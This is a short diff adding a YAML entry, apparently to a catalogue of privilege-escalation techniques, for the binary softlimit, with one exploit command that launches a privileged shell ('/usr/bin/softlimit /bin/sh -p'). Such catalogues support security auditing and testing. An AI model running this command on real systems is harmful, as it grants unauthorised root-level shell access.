@@ -1,0 +1,4 @@
+name: softlimit
+binary_path: /usr/bin/softlimit
+exploit_cmds:
+- /usr/bin/softlimit /bin/sh -p
